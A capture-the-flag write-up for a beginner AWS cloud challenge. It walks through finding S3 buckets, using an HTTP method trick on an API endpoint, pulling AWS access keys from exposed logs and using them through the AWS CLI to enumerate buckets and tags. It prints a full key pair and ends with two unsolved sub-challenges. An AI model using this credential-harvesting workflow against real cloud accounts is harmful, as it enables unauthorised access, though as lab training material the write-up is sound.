![](images/2-header.png)
# Enumerating the cloud
### beginner | cloud | 125 points
<br/>

## Challenge Information
The spaceship that you will use in SPACE RACE is almost ready. One of the last steps is to verify that all of the systems are operational. Unfortunately, the AI controlling the system information decided to take a personal time off for a few days, leaving you without an easy access to the spaceship systems. This is not a problem because, as the cyber security specialist in the ship, you know the spaceship cloud infrastructure like the back of your hand.
<br/><br />

## Sub-Challenges

### [25 points] Spaceship external information endpoint
Your spaceship is located [here](http://planet-bucket-43b2a07.s3-website-eu-west-1.amazonaws.com), can you find the external information panel?

### Solution
Checking the source code of the page reveals another S3 bucket, [rocket-bucket-723aa76](https://rocket-bucket-723aa76.s3.amazonaws.com).

Downloading flag.txt (https://rocket-bucket-723aa76.s3.amazonaws.com/flag.txt) provides the flag for this sub-challenge. The external information panel file will be useful for the next sub-challenge.

Flag: `CTF{0841862f273fd2ca20ea3b94a645781071ab19d7}`

### [25 points] Obtaining the spaceship access keys
You have gained access to the external infromation endpoint. Can you access the spaceship logs to obtain the access keys?

### Solution
The external information panel contains a link to the [spaceship logs](https://g0341x75tb.execute-api.eu-west-1.amazonaws.com/logs). 


Visiting the page returns a "405" request which says that the GET method is not permitted. I immediately started looking for ways to bypass this error, only to find nothing for a long long time. 

Then something struck me and I decided to check the response header.

Status 200? Interesting. So the "method not permitted" response is actually a fake 405 response? Looks like. 

The next train of thought went to trying other HTTP methods apart from GET, which I did using `curl -X <method> <url>`.

```shell
piyagehi@Piyas-MacBook-Pro:~$ curl -X POST https://g0341x75tb.execute-api.eu-west-1.amazonaws.com/logs
405 Request method 'POST' not allowed
piyagehi@Piyas-MacBook-Pro:~$ curl -X PUT https://g0341x75tb.execute-api.eu-west-1.amazonaws.com/logs
The periscope data is optimal. Have a flag for your effort: CTF{9177a9c8bb1cd5c85934}.<br>
[
    {
        "Id": "dfa0f62de13a1719d125ac2f3382543067701c5031289006c8170d3bab33994a",
        "Created": "2021-06-24T17:33:58.623969048Z",
...
```

Nice!

Flag: `CTF{9177a9c8bb1cd5c85934}`

### [25 points] A cleaning bucket
You have managed to access the spaceship. You see a cleaning bucket, the Lambda Thrusters information panel tag and the E-space Computing Cloud system tags. What does the tag in the cleaning bucket says?

### Solution

Somewhere in the spaceship logs, AWS credentials can be found

```shell
...
"Env": [
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "AWS_SECRET_ACCESS_KEY=dpmlpQnMgZFZ5Nt8k7AkCTizqGrY84ZRW55lo+52",
    "AWS_ACCESS_KEY_ID=AKIA552OOUKCBWDIUCWS"
],
...
```

So of course, we set up AWS CLI with these credentials to view further information. For an introduction to AWS access keys, click here.

```bash
piyagehi@Piyas-MacBook-Pro:~$ aws configure --profile=enum-cloud
AWS Access Key ID [None]: AKIA552OOUKCBWDIUCWS
AWS Secret Access Key [None]: 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
Default region name [None]: eu-west-1
Default output format [None]: 
piyagehi@Piyas-MacBook-Pro:~$ aws s3 ls
2021-06-24 20:21:57 cleaningbucket-cf2be35
2021-06-24 20:25:07 planet-bucket-43b2a07
2021-06-24 20:24:40 rocket-bucket-723aa76
piyagehi@Piyas-MacBook-Pro:~$ aws s3 ls cleaningbucket-cf2be35
# No result
```

```shell
piyagehi@Piyas-MacBook-Pro:~$ aws s3api get-bucket-tagging --bucket cleaningbucket-cf2be35
{
    "TagSet": [
        {
            "Key": "hackyholidays",
            "Value": "users"
        },
        {
            "Key": "Flag",
            "Value": "CTF 855cc724fd34896c8875"
            "Key": "Next",
            "Value" : "Lambda Thrusters"
        }
    ]
}
```
### [25 points] Lambda Thrusters information panel
What is the tag in the Lambda Thrusters information panel?

### Solution

Flag: ``
<br/><br />
### [25 points] E-space Cloud Computing System
What is the tag in the E-space Cloud Computing System?

### Solution

Flag: ``
<br/><br />



